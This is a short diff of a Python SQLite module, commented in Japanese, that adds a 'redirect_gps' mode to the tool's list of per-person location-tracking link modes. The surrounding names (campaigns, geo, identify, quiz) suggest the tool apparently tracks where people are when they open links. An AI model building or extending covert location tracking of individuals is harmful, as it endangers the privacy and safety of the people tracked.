@@ -8,6 +8,10 @@ v3:
   ・"database disk image is malformed" からの自動救出（.broken に退避して再構築）
   ・書き込みが壊れていたら1回だけ自動復旧してやり直す
   ・バックアップ用の一貫スナップショット（WAL 対応）
+
+v4:
+  ・追跡リンクの mode に redirect_gps を正式追加（TRACK_IN / TRACK_MODES）
+    redirect_gps が snap に落ちて track_get から拾えなくなるのを修正
 """
 import sqlite3, json, datetime as dt, os, threading
 from contextlib import contextmanager
@@ -256,7 +260,7 @@ CREATE INDEX IF NOT EXISTS idx_ev_code ON link_events(code, kind, id);
 """
 
 # 追跡リンクとして扱う mode
-TRACK_IN = "('snap','live','page','geo','quiz','identify','redirect')"
+TRACK_IN = "('snap','live','page','geo','quiz','identify','redirect','redirect_gps')"
 
 
 def now():
@@ -1016,7 +1020,8 @@ class DB:
             c.execute("UPDATE campaigns SET status=? WHERE id=?", (status, cid))
 
     # ---- 位置追跡（人物ごと・一瞬/ライブ） ----
-    TRACK_MODES = ("snap", "live", "page", "geo", "quiz", "identify", "redirect")
+    TRACK_MODES = ("snap", "live", "page", "geo", "quiz", "identify", "redirect",
+                   "redirect_gps")
 
     def add_track(self, code, person, mode="snap", interval=15, dest="", note=""):
         mode = mode if mode in self.TRACK_MODES else "snap"
